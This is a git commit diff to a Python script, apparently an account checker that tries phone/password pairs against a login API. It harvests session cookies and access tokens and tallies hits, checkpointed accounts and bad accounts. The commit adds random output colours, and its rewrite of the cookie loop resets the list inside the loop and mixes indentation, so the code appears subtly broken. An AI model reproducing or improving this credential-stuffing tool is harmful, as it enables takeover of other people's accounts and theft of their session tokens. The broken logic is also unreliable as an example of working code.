e7c876c1ebf4b51ef824bb8b09d90dc92e0567a3
صالح <salhpees11@gmail.com>
2026-05-03 22:11:38 +0300

    sa.py
    Added random color selection for output display.

--- sa.py
+++ sa.py
@@ -1317,17 +1317,19 @@ def chick_Salh(phone, pas):
 	}
     response = requests.post(url, data=json.dumps(payload), headers=headers).json()
     response_str = str(response)
+	ppp = random.choice([احمر, اصفر, ازرق, بنفسجي, ابيض, سماوي, برتقالي, ذهبي, وردي])
     try:
     	idd = response.get('error', {}).get('error_data', {}).get('uid')
     except:
     	idd = ''
 
-    cookies = []
+    for cookie in response.get('session_cookies', []):
+    	cookies = []
     cookie_string = ""
     if 'session_cookies' in response:
         for cookie in response['session_cookies']:
-        	cookies.append(f"{cookie['name']}={cookie['value']}")
-    cookie_string = ';'.join(cookies)
+            cookies.append(f"{cookie['name']}={cookie['value']}")
+        cookie_string = ';'.join(cookies)
     if "session_key" in response_str or 'access_token' in response_str:
         hit += 1
         
@@ -1391,7 +1393,7 @@ Developer • @salhpy
 
     else:
         bad += 1
-        sys.stdout.write(اعادة + f'\r{احمر}BAD ACCOUNT | Bad {bad} | CP {CP} | Hit {hit} | {اعادة}{ازرق} @salhpy')
+        sys.stdout.write(اعادة + f'\r{ppp}BAD ACCOUNT | Bad {bad} | CP {CP} | Hit {hit} | {اعادة}{ازرق} @salhpy')
         sys.stdout.flush()
 tele()
 choose_country()
